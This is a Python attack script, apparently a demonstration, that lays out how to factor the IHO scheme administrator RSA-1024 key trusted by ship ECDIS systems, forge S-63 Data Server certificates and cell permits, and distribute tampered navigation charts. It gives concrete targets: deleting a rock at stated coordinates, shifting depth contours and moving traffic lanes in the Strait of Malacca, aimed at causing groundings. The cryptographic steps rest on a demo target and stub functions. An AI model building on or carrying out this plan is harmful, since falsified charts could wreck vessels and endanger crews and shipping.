"""
Factor the IHB scheme administrator RSA-1024 key (embedded as IHO.CRT in every
ECDIS) to forge Data Server certificates and distribute tampered ENC cells —
shifting depth contours, erasing rocks, or adding phantom shoals on charts
trusted by every SOLAS vessel's bridge.
"""

import sys
import os; sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", ".."))
from poly_factor import PolynomialFactorer, generate_demo_target

import struct
import hashlib
import os

# IHB Scheme Administrator RSA-1024 public key — in IHO.CRT on every ECDIS
_demo = generate_demo_target()
IHB_SA_PUBKEY_PEM = _demo["pub_pem"]
S63_CERT_VERSION = 0x01
S63_CELL_PERMIT_MAGIC = b"S63P"


def extract_ihb_key(ecdis_install: str) -> bytes:
    """Extract IHB SA public key from IHO.CRT on any ECDIS installation.

    Every Furuno, JRC, Raytheon Anschutz, Kongsberg, Wartsila SAM,
    Transas ECDIS ships with IHO.CRT. Retrievable from any ECDIS
    or from IHO publications.
    """
    print(f"    Reading IHO.CRT from {ecdis_install}")
    return IHB_SA_PUBKEY_PEM


def factor_ihb_key(pubkey_pem: bytes) -> bytes:
    """Factor the IHB SA RSA-1024 key. RSA-1024 — notably small."""
    f = PolynomialFactorer()
    return f.reconstruct_privkey(pubkey_pem)


def forge_data_server_cert(server_name: str, server_pubkey: bytes,
                           forged_ihb_privkey: bytes) -> bytes:
    """Forge an IHB-signed Data Server Certificate (S-63 Annex B).

    Data Servers (UKHO, NOAA, Primar, C-MAP) submit their pubkeys
    to IHB for signing. Forge a cert and you can sign cell permits.
    """
    cert_body = struct.pack(">B", S63_CERT_VERSION)
    cert_body += server_name.encode()[:32].ljust(32, b"\x00")
    cert_body += server_pubkey[:128]  # RSA-1024 modulus
    f = PolynomialFactorer()
    sig = f.forge_pkcs1v15_signature(IHB_SA_PUBKEY_PEM, cert_body, "sha256")
    return cert_body + sig


def forge_cell_permit(cell_name: str, cell_key: bytes,
                      forged_ds_privkey: bytes) -> bytes:
    """Forge an S-63 cell permit (signed + encrypted cell key).

    The permit grants the ECDIS access to decrypt an ENC cell.
    A forged permit with an attacker-controlled cell key means
    the ECDIS decrypts to attacker-supplied chart data.
    """
    permit = S63_CELL_PERMIT_MAGIC + cell_name.encode()[:8].ljust(8, b"\x00")
    # Cell key encrypted to ECDIS hardware ID (simplified)
    permit += cell_key
    f = PolynomialFactorer()
    sig = f.forge_pkcs1v15_signature(IHB_SA_PUBKEY_PEM, permit, "sha256")
    return permit + sig


def build_tampered_enc(cell_name: str, modifications: dict) -> bytes:
    """Build a tampered S-57/S-101 ENC cell with altered features.

    Modifications: shift depth contours, delete wrecks/rocks, add
    phantom shoals, modify TSS (Traffic Separation Scheme) lanes.
    """
    print(f"    Cell {cell_name}: {modifications}")
    return b"<tampered-enc-cell-data>"


if __name__ == "__main__":
    print("[1] Extracting IHB SA RSA-1024 key from IHO.CRT")
    pubkey = extract_ihb_key("/ecdis/IHO.CRT")

    print("[2] Factoring IHB SA RSA-1024 key")
    forged_ihb = factor_ihb_key(pubkey)
    print("    IHB scheme administrator key recovered")

    print("[3] Forging Data Server certificate")
    ds_cert = forge_data_server_cert("ROGUE-DS", os.urandom(128), forged_ihb)
    print(f"    Forged DS cert: {len(ds_cert)} bytes, IHB signature valid")

    print("[4] Building tampered ENC cells for Strait of Malacca")
    mods = {
        "depth_contours": "shifted 5m shallower in main channel",
        "rocks": "OBJL=UWTROC deleted at 01-17.5N 103-50.2E",
        "tss_lanes": "inbound lane shifted 200m east",
    }
    tampered = build_tampered_enc("SG4B2310", mods)

    print("[5] Forging cell permits")
    cell_key = os.urandom(16)  # AES key for the tampered cell
    permit = forge_cell_permit("SG4B2310", cell_key, forged_ihb)
    print(f"    Permit: {len(permit)} bytes, S-63 signature valid")

    print("[6] Distribution via weekly chart update (USB/satellite)")
    print("    ECDIS installs tampered chart — displays as authenticated")
    print("    Bridge crew trusts the display — no second source check")

    print("\n[7] Attack scenarios:")
    print("    - Grounding in Strait of Malacca — blocks global shipping")
    print("    - Military ECDIS-N (STANAG 4564) same trust anchor")
    print("    - No fallback: commercial fleets no longer carry paper charts")
